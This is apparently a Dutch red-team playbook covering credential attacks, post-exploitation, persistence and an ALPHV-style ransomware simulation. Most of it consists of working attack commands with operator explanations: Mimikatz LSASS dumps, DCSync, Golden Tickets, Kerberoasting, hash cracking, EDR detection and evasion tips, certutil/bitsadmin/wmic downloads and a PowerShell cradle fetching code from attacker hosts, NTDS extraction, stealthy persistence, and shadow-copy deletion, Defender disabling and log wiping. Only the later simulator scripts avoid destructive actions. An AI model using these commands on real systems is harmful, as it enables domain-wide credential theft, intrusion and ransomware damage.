# FASE 5: CREDENTIAL ATTACKS

## 5.1 Mimikatz Operations

```powershell
# Dump credentials uit LSASS geheugen
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

> **📘 UITLEG:**
> Dumpt alle credentials uit het LSASS proces geheugen.
>
> **Wat wordt gedumpt:**
> - NTLM hashes (kunnen worden gebruikt voor Pass-the-Hash)
> - Kerberos tickets (TGT/TGS)
> - Cleartext wachtwoorden (als WDigest enabled is)
> - Kerberos encryption keys
>
> **Vereisten:** Administrator/SYSTEM rechten op de machine.
>
> **Output voorbeeld:**
> ```
> Authentication Id : 0 ; 999 (00000000:000003e7)
> Session           : Interactive from 1
> User Name         : jsmith
> Domain            : CORP
> Logon Server      : DC01
> NTLM              : 64f12cddaa88057e06a81b54e73b949b
> SHA1              : cba4e545b7ec918129725154b29f055e4cd5aea8
> ```

---

```powershell
# DCSync - Dump alle domain credentials
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /all /csv"'
```

> **📘 UITLEG:**
> DCSync imiteert een Domain Controller en vraagt password replicatie aan.
>
> **Wat gebeurt er:**
> 1. Mimikatz doet zich voor als een DC
> 2. Vraagt replicatie van password data (via MS-DRSR protocol)
> 3. Ontvangt NTLM hashes van ALLE domain accounts
>
> **Vereisten:**
> - Domain Admin rechten, OF
> - "Replicating Directory Changes" permission
>
> **Output:** CSV met alle usernames en NTLM hashes.
>
> **Inclusief:** krbtgt hash (voor Golden Ticket attacks!)

---

```powershell
# Golden Ticket aanmaken
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:64f12cddaa88057e06a81b54e73b949b /ptt"'
```

> **📘 UITLEG:**
> Golden Ticket is een vervalst Kerberos TGT ticket.
>
> **Parameters:**
> - `/user:Administrator` = user om te impersoneren
> - `/domain:corp.local` = domain name
> - `/sid:S-1-5-21-...` = domain SID
> - `/krbtgt:HASH` = krbtgt account NTLM hash (van DCSync)
> - `/ptt` = pass-the-ticket (inject in huidige sessie)
>
> **Resultaat:** Je bent nu Administrator in het hele domain!
>
> **Persistence:** Golden Ticket blijft werken tot:
> - krbtgt password 2x wordt gereset
> - Ticket verloopt (default: 10 jaar)

---

```powershell
# Kerberoasting - Dump service account hashes
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

> **📘 UITLEG:**
> Kerberoasting vraagt TGS tickets voor accounts met SPNs.
>
> **Hoe werkt het:**
> 1. Elke user kan TGS aanvragen voor services met SPN
> 2. TGS is encrypted met service account's NTLM hash
> 3. Offline kraken van TGS → service account password
>
> **Waarom effectief:**
> - Vereist geen speciale rechten
> - Service accounts hebben vaak zwakke/oude wachtwoorden
> - Geen interactie met target systeem
>
> **Output format:** Hashcat-ready format (mode 13100)

---

## 5.2 LSASS Dumping Techniques

```powershell
# Methode 1: Comsvcs.dll (native Windows)
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\Windows\Temp\debug64.dmp full
```

> **📘 UITLEG:**
> Dump LSASS geheugen met native Windows DLL.
>
> **Waarom deze methode:**
> - `comsvcs.dll` is onderdeel van Windows
> - Signed door Microsoft
> - Minder AV/EDR detectie dan Mimikatz
>
> **Stappen:**
> 1. Get LSASS process ID
> 2. Roep MiniDump functie aan via rundll32
> 3. Output is een .dmp bestand
>
> **Daarna:** Analyseer dump offline met Mimikatz.

---

```powershell
# Methode 2: ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp -accepteula
```

> **📘 UITLEG:**
> Microsoft Sysinternals tool voor memory dumps.
>
> **Waarom effectief:**
> - Signed door Microsoft
> - Legitieme admin tool
> - Sommige AV whitelisten Sysinternals
>
> **Parameters:**
> - `-ma` = full memory dump
> - `-accepteula` = skip EULA prompt

---

```powershell
# Offline analyse van dump
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

> **📘 UITLEG:**
> Analyseer LSASS dump op een andere machine.
>
> **Voordelen:**
> - Geen Mimikatz execution op target
> - Minder detectie kans
> - Kan op analyst workstation worden gedaan
>
> **Flow:**
> 1. Dump LSASS op target (comsvcs/procdump)
> 2. Exfiltreer .dmp bestand
> 3. Analyseer op eigen machine met Mimikatz

---

## 5.3 Password Cracking

```bash
# NTLM hashes kraken
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -O
```

> **📘 UITLEG:**
> Crack Windows NTLM hashes met hashcat.
>
> **Parameters:**
> - `-m 1000` = hash mode voor NTLM
> - `ntlm_hashes.txt` = bestand met hashes
> - `rockyou.txt` = wordlist
> - `-O` = optimized kernels (sneller)
>
> **Snelheid:** Op moderne GPU: ~50 miljard hashes/seconde
>
> **NTLM is ZWAK:** Geen salt, directe hash van password.

---

```bash
# Kerberoast hashes kraken
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> **📘 UITLEG:**
> Crack Kerberoast (TGS-REP) hashes.
>
> **Parameters:**
> - `-m 13100` = Kerberos 5 TGS-REP
> - `-r best64.rule` = password mutation rules
>
> **Rules transformeren wordlist:**
> - `password` → `Password`, `PASSWORD`, `password1`
> - `password` → `p@ssword`, `passw0rd`, `password!`
>
> **Kerberoast is trager:** ~500K hashes/sec (vs miljarden voor NTLM)

---

```bash
# NetNTLMv2 hashes kraken (van Responder)
hashcat -m 5600 responder_hashes.txt rockyou.txt -r best64.rule
```

> **📘 UITLEG:**
> Crack NetNTLMv2 hashes captured door Responder.
>
> **Hash format:**
> ```
> user::DOMAIN:challenge:HMAC-MD5:blob
> ```
>
> **Snelheid:** ~5 miljard/sec - redelijk snel.
>
> **Tip:** Als cracking te lang duurt, gebruik NTLM relay in plaats van cracking.

---

# FASE 6: POST-EXPLOITATION

## 6.1 Windows Enumeration

```powershell
# Systeem informatie
systeminfo
```

> **📘 UITLEG:**
> Basis systeem informatie.
>
> **Belangrijke info:**
> - OS versie en build nummer
> - Hotfixes (patch level)
> - Network configuratie
> - Domain membership

---

```powershell
# Huidige user context
whoami /all
```

> **📘 UITLEG:**
> Volledige informatie over huidige user.
>
> **Output bevat:**
> - Username en SID
> - Group memberships
> - Privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
>
> **Belangrijk privilege:** `SeImpersonatePrivilege` = Potato attacks mogelijk!

---

```powershell
# Domain Admin groep leden
net group "Domain Admins" /domain
```

> **📘 UITLEG:**
> Lijst van alle Domain Admins.
>
> **Doel:** Identificeer high-value targets voor credential hunting.

---

```powershell
# Security software detectie
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled
```

> **📘 UITLEG:**
> Check Windows Defender status.
>
> **Output:**
> - `AntivirusEnabled` = Defender actief?
> - `RealTimeProtectionEnabled` = Real-time scanning?
> - `BehaviorMonitorEnabled` = Gedragsanalyse?
>
> **Als alles True:** Evasion technieken nodig!

---

```powershell
# EDR/AV process detectie
Get-Process | Where-Object {$_.ProcessName -match 'MsMpEng|CrowdStrike|Carbon|Cylance|SentinelOne|Tanium|cb|csfalconservice'}
```

> **📘 UITLEG:**
> Detecteer draaiende security software.
>
> **Belangrijke processen:**
> - `MsMpEng` = Windows Defender
> - `csfalconservice` = CrowdStrike Falcon
> - `cb` = Carbon Black
> - `SentinelOne` = SentinelOne agent
>
> **Volgende stap:** Research specifieke bypass technieken voor gedetecteerde product.

---

## 6.2 Living-off-the-Land (Volt Typhoon Style)

```powershell
# Download bestand via certutil (LOLBin)
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\update.exe
```

> **📘 UITLEG:**
> `certutil` is een Windows certificate tool die ook files kan downloaden.
>
> **Waarom LOLBins:**
> - Native Windows binary (geen malware detectie)
> - Signed door Microsoft
> - Legitiem admin gebruik (minder verdacht)
>
> **Volt Typhoon** gebruikt exclusief LOLBins - geen custom malware!

---

```powershell
# Download via bitsadmin
bitsadmin /transfer downloadJob /download /priority high http://attacker.com/payload.exe C:\Windows\Temp\update.exe
```

> **📘 UITLEG:**
> `bitsadmin` = Background Intelligent Transfer Service tool.
>
> **Parameters:**
> - `/transfer downloadJob` = job naam
> - `/priority high` = snelle download
>
> **Voordeel:** Download gaat door zelfs bij network interrupts.

---

```powershell
# Execute via wmic
wmic process call create "powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://attacker/script.ps1'))"
```

> **📘 UITLEG:**
> Gebruik WMI voor proces executie.
>
> **Waarom WMIC:**
> - Standaard Windows tool
> - Minder gelogd dan PowerShell direct
> - Kan remote execution (met credentials)

---

```powershell
# Remote execution via wmic
wmic /node:192.168.1.50 /user:CORP\admin /password:Summer2024! process call create "cmd /c whoami > C:\temp\out.txt"
```

> **📘 UITLEG:**
> Remote command execution via WMI.
>
> **Parameters:**
> - `/node:IP` = target machine
> - `/user:` en `/password:` = credentials
>
> **Output:** Command output naar bestand op remote machine.

---

```powershell
# Credentials dumpen via ntdsutil (DC only)
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds_dump" q q
```

> **📘 UITLEG:**
> Dump AD database (NTDS.dit) via native tool.
>
> **Wat krijg je:**
> - `NTDS.dit` = Active Directory database
> - `SYSTEM` = Registry hive (voor decryptie key)
>
> **Daarna:** Gebruik secretsdump.py om hashes te extracten.
>
> **Volt Typhoon techniek:** Geen Mimikatz, alleen native tools.

---

# FASE 7: PERSISTENCE MECHANISMS

## 7.1 Windows Persistence

```powershell
# Registry Run Key (user level)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\beacon.exe" /f
```

> **📘 UITLEG:**
> Registry Run key executeert programma bij elke user login.
>
> **Parameters:**
> - `HKCU\...\Run` = per-user (geen admin nodig)
> - `/v "SecurityUpdate"` = legitiem klinkende naam
> - `/t REG_SZ` = string type
> - `/d "..."` = pad naar payload
> - `/f` = force (geen confirmatie)
>
> **HKCU vs HKLM:**
> - HKCU = alleen huidige user, geen admin nodig
> - HKLM = alle users, admin vereist

---

```powershell
# Scheduled Task (SYSTEM level)
schtasks /create /tn "Microsoft\Windows\Maintenance\SecurityScan" /tr "C:\Windows\System32\beacon.exe" /sc hourly /mo 1 /ru SYSTEM /f
```

> **📘 UITLEG:**
> Scheduled task voor periodieke uitvoering.
>
> **Parameters:**
> - `/tn "Microsoft\Windows\..."` = legitiem pad (hide in Microsoft folder)
> - `/sc hourly /mo 1` = elk uur
> - `/ru SYSTEM` = draai als SYSTEM (hoogste rechten)
>
> **Voordeel boven Run key:** Draait ook zonder user login.

---

```powershell
# Windows Service
sc create "WindowsSecurityManager" binpath= "C:\Windows\System32\svc.exe" start= auto obj= LocalSystem
sc start "WindowsSecurityManager"
```

> **📘 UITLEG:**
> Custom Windows service voor persistence.
>
> **Parameters:**
> - `binpath=` = pad naar executable (LET OP: spatie na `=`)
> - `start= auto` = automatisch bij boot
> - `obj= LocalSystem` = SYSTEM privileges
>
> **Voordeel:** Zeer persistent, draait onafhankelijk van user sessions.

---

```powershell
# WMI Event Subscription (zeer stealthy)
# Filter - trigger conditie
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = 'SecurityFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8"
}

# Consumer - actie bij trigger
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'SecurityConsumer'
    CommandLineTemplate = 'C:\Windows\System32\beacon.exe'
}

# Binding
$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

> **📘 UITLEG:**
> WMI persistence is zeer moeilijk te detecteren.
>
> **Hoe werkt het:**
> 1. **Filter:** Definieer wanneer te triggeren (elke dag om 8:00)
> 2. **Consumer:** Definieer wat uit te voeren (beacon.exe)
> 3. **Binding:** Koppel filter aan consumer
>
> **Waarom stealthy:**
> - Geen files in startup folders
> - Geen zichtbare scheduled tasks
> - Opgeslagen in WMI database (niet filesystem)
>
> **Detectie:** `Get-WmiObject -Namespace root\subscription -Class __EventConsumer`

---


---

# FASE 8: RANSOMWARE SIMULATION (ALPHV/BlackCat Style)

## 8.1 ALPHV Ransomware Overview

> **📘 CONTEXT:**
> ALPHV (BlackCat) is geschreven in Rust en staat bekend om:
> - Cross-platform (Windows, Linux, ESXi)
> - Intermittent encryption (sneller, moeilijker te detecteren)
> - Built-in credential harvesting
> - ESXi VM encryption
> - Affiliate model (RaaS)
>
> **De volgende samples zijn voor EDUCATIEVE DOELEINDEN / SIMULATIE.**
> Ze encrypteren NIET echt maar demonstreren de technieken.

---

## 8.2 Pre-Encryption Fase

```powershell
# ALPHV: Shadow Copies verwijderen
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
```

> **📘 UITLEG:**
> Volume Shadow Copies zijn Windows snapshots die voor recovery kunnen worden gebruikt.
>
> **Commands:**
> - `vssadmin delete shadows /all /quiet` = verwijder alle shadows, geen prompt
> - `wmic shadowcopy delete` = alternatieve methode
>
> **Doel:** Voorkom dat victim bestanden kan herstellen via Previous Versions.
>
> **SIMULATIE:** Log dat je dit ZOU uitvoeren, maar voer niet daadwerkelijk uit.

---

```powershell
# ALPHV: Windows Recovery uitschakelen
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
```

> **📘 UITLEG:**
> Schakel Windows Recovery opties uit.
>
> **Effect:**
> - Geen F8 Recovery Mode
> - Geen Automatic Repair
> - Boot naar encrypted staat zonder ontsnapping
>
> **SIMULATIE:** Documenteer, niet uitvoeren op client systemen.

---

```powershell
# ALPHV: Security software stoppen
Stop-Service -Name "WinDefend" -Force
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Backup software stoppen
Stop-Service -Name "veeam*" -Force
Stop-Service -Name "backup*" -Force
Stop-Service -Name "sql*" -Force
```

> **📘 UITLEG:**
> ALPHV stopt security en backup services voor encryption.
>
> **Targets:**
> - Windows Defender
> - Veeam Backup
> - SQL Server (voor database encryption)
> - Volume Shadow Service
>
> **Waarom SQL stoppen?** Database files zijn locked als service draait.

---

```powershell
# ALPHV: Event logs wissen (anti-forensics)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
```

> **📘 UITLEG:**
> Wis Windows Event Logs om forensisch onderzoek te bemoeilijken.
>
> **Gewiste logs:**
> - System = OS events
> - Security = Logon events, audit
> - Application = App errors
> - PowerShell = Command history

---

## 8.3 ALPHV Ransomware Simulator (Python)

```python
#!/usr/bin/env python3
"""
alphv_simulator.py - ALPHV/BlackCat Ransomware Simulator
EDUCATIONAL PURPOSE ONLY - DOES NOT ENCRYPT

Demonstreert ALPHV technieken voor red team training.
"""

import os
import json
import base64
import hashlib
import platform
from pathlib import Path
from datetime import datetime
from typing import List, Dict

class ALPHVSimulator:
    """
    ALPHV Ransomware Simulator voor training.
    ENCRYPT NIETS - alleen logging en rapportage.
    """
    
    def __init__(self, config_path: str = None):
        self.config = self._load_config(config_path)
        self.stats = {
            "files_found": 0,
            "files_simulated": 0,
            "total_size_bytes": 0,
            "extensions_found": {},
            "directories_scanned": 0
        }
        self.simulation_log = []
        
    def _load_config(self, path: str) -> Dict:
        """Load ransomware configuratie."""
        default_config = {
            "target_extensions": [
                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                ".pdf", ".txt", ".csv", ".sql", ".mdb", ".accdb",
                ".zip", ".rar", ".7z", ".tar", ".gz",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp",
                ".psd", ".ai", ".dwg", ".dxf",
                ".vmdk", ".vmx", ".vhd", ".vhdx"  # VM files
            ],
            "skip_directories": [
                "Windows", "Program Files", "Program Files (x86)",
                "$Recycle.Bin", "System Volume Information"
            ],
            "skip_extensions": [
                ".exe", ".dll", ".sys", ".ini", ".lnk"
            ],
            "ransom_note_name": "RECOVER-FILES.txt",
            "encrypted_extension": ".alphv",
            "intermittent_percent": 25  # ALPHV encrypts only 25% of file
        }
        
        if path and os.path.exists(path):
            with open(path) as f:
                return {**default_config, **json.load(f)}
        return default_config
    
    def scan_directory(self, path: str) -> List[str]:
        """
        Scan directory voor target files.
        Returns lijst van files die ZOUDEN worden encrypted.
        """
        target_files = []
        
        try:
            for root, dirs, files in os.walk(path):
                # Skip system directories
                dirs[:] = [d for d in dirs if d not in self.config["skip_directories"]]
                self.stats["directories_scanned"] += 1
                
                for file in files:
                    filepath = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    # Check of file target is
                    if ext in self.config["target_extensions"]:
                        try:
                            size = os.path.getsize(filepath)
                            self.stats["files_found"] += 1
                            self.stats["total_size_bytes"] += size
                            
                            # Track extension stats
                            self.stats["extensions_found"][ext] = \
                                self.stats["extensions_found"].get(ext, 0) + 1
                            
                            target_files.append({
                                "path": filepath,
                                "size": size,
                                "extension": ext
                            })
                            
                        except (PermissionError, OSError):
                            pass
                            
        except Exception as e:
            self.simulation_log.append(f"Error scanning {path}: {e}")
        
        return target_files
    
    def simulate_encryption(self, files: List[Dict]) -> Dict:
        """
        SIMULEERT encryption - encrypt NIETS daadwerkelijk.
        Retourneert statistieken over wat encrypted ZOU zijn.
        """
        simulation_result = {
            "would_encrypt": len(files),
            "would_encrypt_bytes": sum(f["size"] for f in files),
            "intermittent_bytes": 0,  # ALPHV encrypts only portion
            "by_extension": {},
            "sample_files": files[:10]  # First 10 als voorbeeld
        }
        
        # ALPHV intermittent encryption simulatie
        for file in files:
            # ALPHV encrypts alleen eerste 25% van file
            intermittent_size = int(file["size"] * (self.config["intermittent_percent"] / 100))
            simulation_result["intermittent_bytes"] += intermittent_size
            
            ext = file["extension"]
            if ext not in simulation_result["by_extension"]:
                simulation_result["by_extension"][ext] = {"count": 0, "size": 0}
            simulation_result["by_extension"][ext]["count"] += 1
            simulation_result["by_extension"][ext]["size"] += file["size"]
            
            # Log voor rapport
            self.simulation_log.append(
                f"[SIMULATE] Would encrypt: {file['path']} ({file['size']} bytes)"
            )
            self.stats["files_simulated"] += 1
        
        return simulation_result
    
    def generate_ransom_note(self) -> str:
        """Genereer ALPHV-style ransom note (voor demonstratie)."""
        note = f"""
    >> What happened?

    Your network has been infected by ALPHV ransomware.
    All your files have been encrypted with military-grade encryption.

    >> What does this mean?

    Your files are currently inaccessible. Only we have the key to decrypt them.

    >> What should you do?

    Contact us immediately using the link below to negotiate.
    The longer you wait, the higher the price becomes.

    >> IMPORTANT

    - Do not try to decrypt files yourself - this will destroy them permanently
    - Do not contact law enforcement - they cannot help and will only delay
    - Do not hire recovery companies - they will just contact us and add their fee

    >> Contact

    Access our chat portal via Tor Browser:
    http://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion/{self._generate_victim_id()}

    Your personal victim ID: {self._generate_victim_id()}

    >> Proof

    We can decrypt 2 files for free as proof. Contact us.

    ALPHV Team
    ============================================================
    [SIMULATION - THIS IS NOT A REAL RANSOM NOTE]
    Generated for educational/training purposes only.
    ============================================================
        """
        return note
    
    def _generate_victim_id(self) -> str:
        """Genereer fake victim ID."""
        data = f"{platform.node()}-{datetime.now().isoformat()}"
        return hashlib.sha256(data.encode()).hexdigest()[:32]
    
    def generate_report(self, scan_results: Dict) -> str:
        """Genereer simulatie rapport."""
        report = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ALPHV RANSOMWARE SIMULATION REPORT                        ║
║                          XPOSE Security Red Team                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
║ System: {platform.node()}
║ Platform: {platform.system()} {platform.release()}
╚══════════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════════
                              IMPACT ASSESSMENT
═══════════════════════════════════════════════════════════════════════════════

Files That Would Be Encrypted:
------------------------------
Total Files:        {scan_results['would_encrypt']:,}
Total Size:         {scan_results['would_encrypt_bytes'] / (1024**3):.2f} GB
Intermittent Size:  {scan_results['intermittent_bytes'] / (1024**3):.2f} GB (ALPHV encrypts {self.config['intermittent_percent']}%)

Breakdown by Extension:
-----------------------
"""
        for ext, data in sorted(scan_results['by_extension'].items(), 
                                key=lambda x: x[1]['size'], reverse=True)[:15]:
            report += f"  {ext:10} : {data['count']:>6} files, {data['size']/(1024**2):>10.2f} MB\n"
        
        report += f"""
Sample Files (first 10):
------------------------
"""
        for f in scan_results['sample_files']:
            report += f"  - {f['path'][:70]}... ({f['size']/(1024**2):.2f} MB)\n"
        
        report += f"""
═══════════════════════════════════════════════════════════════════════════════
                             SIMULATION STATISTICS
═══════════════════════════════════════════════════════════════════════════════

Directories Scanned:  {self.stats['directories_scanned']:,}
Files Identified:     {self.stats['files_found']:,}
Simulated Actions:    {self.stats['files_simulated']:,}

═══════════════════════════════════════════════════════════════════════════════
                                CONCLUSIONS
═══════════════════════════════════════════════════════════════════════════════

If this were a real ALPHV attack:
- {scan_results['would_encrypt']:,} files would be encrypted
- {scan_results['would_encrypt_bytes'] / (1024**3):.2f} GB of data would be at risk
- Recovery without payment/backups would be IMPOSSIBLE
- Estimated downtime: 2-4 weeks minimum

RECOMMENDATION: Review backup procedures and ensure offline/immutable backups exist.

═══════════════════════════════════════════════════════════════════════════════
                    [END OF SIMULATION - NO FILES WERE HARMED]
═══════════════════════════════════════════════════════════════════════════════
"""
        return report


# Voorbeeld gebruik
if __name__ == "__main__":
    print("[*] ALPHV Ransomware Simulator - EDUCATIONAL USE ONLY")
    print("[*] This tool does NOT encrypt any files")
    print()
    
    simulator = ALPHVSimulator()
    
    # Scan specifieke directory (pas aan voor test)
    target_path = "C:\\Users"  # Of specifiek test pad
    print(f"[*] Scanning: {target_path}")
    
    files = simulator.scan_directory(target_path)
    print(f"[+] Found {len(files)} target files")
    
    results = simulator.simulate_encryption(files)
    
    report = simulator.generate_report(results)
    print(report)
    
    # Save report
    with open("alphv_simulation_report.txt", "w") as f:
        f.write(report)
    print("[+] Report saved to alphv_simulation_report.txt")
```

> **📘 UITLEG:**
> Dit is een SIMULATOR - het encrypt GEEN bestanden.
>
> **Wat doet het:**
> 1. Scant directories voor target file types
> 2. Berekent impact (hoeveel files/data zouden encrypted worden)
> 3. Simuleert ALPHV's intermittent encryption (alleen 25% van file)
> 4. Genereert rapport voor client
>
> **ALPHV Kenmerken gesimuleerd:**
> - Target extensions (.docx, .xlsx, .pdf, .vmdk, etc.)
> - Skip system directories
> - Intermittent encryption (sneller dan full encryption)
> - Victim ID generatie
> - Ransom note template
>
> **Red Team gebruik:** Demonstreer potentiële impact aan client.

---

## 8.4 ESXi Ransomware Simulation (ALPHV Style)

```bash
#!/bin/bash
# esxi_simulator.sh - ESXi Ransomware Simulation
# EDUCATIONAL - DOES NOT ENCRYPT

echo "╔════════════════════════════════════════════════════════════╗"
echo "║     ALPHV ESXi Ransomware Simulator - TRAINING ONLY       ║"
echo "║              NO VMs WILL BE HARMED                        ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Check of we op ESXi draaien
if [ ! -f /etc/vmware-release ]; then
    echo "[!] Not running on ESXi - simulation mode"
    exit 1
fi

echo "[*] ESXi Version: $(cat /etc/vmware-release)"
echo ""

# === VM ENUMERATION ===
echo "═══════════════════════════════════════════════════════════"
echo "                    VM ENUMERATION"
echo "═══════════════════════════════════════════════════════════"

echo "[*] Enumerating VMs..."
vim-cmd vmsvc/getallvms

VM_COUNT=$(vim-cmd vmsvc/getallvms 2>/dev/null | tail -n +2 | wc -l)
echo ""
echo "[+] Total VMs found: $VM_COUNT"

# === DATASTORE ENUMERATION ===
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "                  DATASTORE ENUMERATION"
echo "═══════════════════════════════════════════════════════════"

echo "[*] Enumerating datastores..."
esxcli storage filesystem list

# Calculate total VMDK size
echo ""
echo "[*] Calculating potential impact..."
TOTAL_VMDK_SIZE=$(find /vmfs/volumes -name "*.vmdk" -exec du -ch {} + 2>/dev/null | tail -1 | cut -f1)
echo "[+] Total VMDK size: $TOTAL_VMDK_SIZE"

# === RUNNING VMS ===
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "                    RUNNING VMs"
echo "═══════════════════════════════════════════════════════════"

echo "[*] Currently running VMs:"
esxcli vm process list

RUNNING_COUNT=$(esxcli vm process list 2>/dev/null | grep -c "World ID")
echo ""
echo "[+] Running VMs: $RUNNING_COUNT"

# === TARGET FILES ===
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "                   TARGET FILES"
echo "═══════════════════════════════════════════════════════════"

echo "[*] Target file types (would be encrypted):"
echo ""

VMDK_COUNT=$(find /vmfs/volumes -name "*.vmdk" 2>/dev/null | wc -l)
VMX_COUNT=$(find /vmfs/volumes -name "*.vmx" 2>/dev/null | wc -l)
VMXF_COUNT=$(find /vmfs/volumes -name "*.vmxf" 2>/dev/null | wc -l)
NVRAM_COUNT=$(find /vmfs/volumes -name "*.nvram" 2>/dev/null | wc -l)
VMSD_COUNT=$(find /vmfs/volumes -name "*.vmsd" 2>/dev/null | wc -l)
VMSN_COUNT=$(find /vmfs/volumes -name "*.vmsn" 2>/dev/null | wc -l)

echo "  .vmdk (Virtual Disks):    $VMDK_COUNT files"
echo "  .vmx  (VM Config):        $VMX_COUNT files"
echo "  .vmxf (VM Extended):      $VMXF_COUNT files"
echo "  .nvram (BIOS State):      $NVRAM_COUNT files"
echo "  .vmsd (Snapshot Meta):    $VMSD_COUNT files"
echo "  .vmsn (Snapshot State):   $VMSN_COUNT files"

# === SIMULATION SUMMARY ===
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "                  SIMULATION SUMMARY"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "If this were a real ALPHV ESXi attack:"
echo ""
echo "  PHASE 1: Stop all running VMs"
echo "    Command: vim-cmd vmsvc/power.off <vmid>"
echo "    Impact: $RUNNING_COUNT VMs would be shut down"
echo ""
echo "  PHASE 2: Encrypt VMDK files"
echo "    Target: $VMDK_COUNT virtual disk files"
echo "    Impact: $TOTAL_VMDK_SIZE of data"
echo ""
echo "  PHASE 3: Encrypt config files"
echo "    Target: $VMX_COUNT VM configuration files"
echo "    Impact: VMs cannot boot even with recovered disks"
echo ""
echo "  ESTIMATED TOTAL IMPACT:"
echo "    - $VM_COUNT VMs encrypted"
echo "    - Complete virtualization infrastructure offline"
echo "    - Recovery time: Days to weeks"
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "          [SIMULATION COMPLETE - NO CHANGES MADE]"
echo "═══════════════════════════════════════════════════════════"
```

> **📘 UITLEG:**
> ESXi ransomware simulation script.
>
> **Wat ALPHV doet op ESXi:**
> 1. `vim-cmd vmsvc/power.off <vmid>` - Stop alle VMs
> 2. Encrypt `.vmdk` files (virtual hard drives)
> 3. Encrypt `.vmx` files (VM configuratie)
> 4. Drop ransom note
>
> **Impact:** Hele virtuele infrastructuur down in minuten.
>
> **Dit script:**
> - Enumereert VMs en datastores
> - Berekent potentiële impact
> - VOERT GEEN DESTRUCTIEVE ACTIES UIT
>
> **Voor red team rapport:** Toont aan dat ESXi compromise = catastrophale impact.

---

## 8.5 Backup Destruction Assessment

```powershell
# backup_assessment.ps1 - Check backup vulnerability
# SIMULATIE - Voert geen destructieve acties uit

Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "          ALPHV Backup Destruction Assessment - SIMULATION         " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# Shadow Copies check
Write-Host "[*] Checking Volume Shadow Copies..." -ForegroundColor Yellow
$shadows = Get-WmiObject Win32_ShadowCopy
if ($shadows) {
    Write-Host "[!] Shadow Copies FOUND: $($shadows.Count) copies" -ForegroundColor Red
    Write-Host "    ALPHV would delete these with: vssadmin delete shadows /all /quiet" -ForegroundColor Gray
} else {
    Write-Host "[+] No Shadow Copies found" -ForegroundColor Green
}
Write-Host ""

# Backup software detection
Write-Host "[*] Detecting Backup Software..." -ForegroundColor Yellow
$backupServices = Get-Service | Where-Object {
    $_.DisplayName -match "Veeam|Backup|Acronis|Commvault|Veritas|Carbonite|Datto|StorageCraft"
}

if ($backupServices) {
    Write-Host "[!] Backup services FOUND:" -ForegroundColor Red
    foreach ($svc in $backupServices) {
        Write-Host "    - $($svc.DisplayName) [$($svc.Status)]" -ForegroundColor Gray
    }
    Write-Host "    ALPHV would stop these before encryption" -ForegroundColor Gray
} else {
    Write-Host "[+] No standard backup services detected" -ForegroundColor Green
}
Write-Host ""

# Windows Server Backup
Write-Host "[*] Checking Windows Server Backup..." -ForegroundColor Yellow
try {
    $wbadmin = wbadmin get versions 2>$null
    if ($wbadmin) {
        Write-Host "[!] Windows Backup history FOUND" -ForegroundColor Red
        Write-Host "    ALPHV would delete with: wbadmin delete catalog -quiet" -ForegroundColor Gray
    }
} catch {
    Write-Host "[+] No Windows Backup history" -ForegroundColor Green
}
Write-Host ""

# Network shares (potential backup locations)
Write-Host "[*] Checking mounted network shares..." -ForegroundColor Yellow
$shares = Get-SmbMapping
if ($shares) {
    Write-Host "[!] Network shares FOUND:" -ForegroundColor Red
    foreach ($share in $shares) {
        Write-Host "    - $($share.LocalPath) -> $($share.RemotePath)" -ForegroundColor Gray
    }
    Write-Host "    ALPHV would encrypt these too!" -ForegroundColor Gray
} else {
    Write-Host "[+] No network shares mounted" -ForegroundColor Green
}
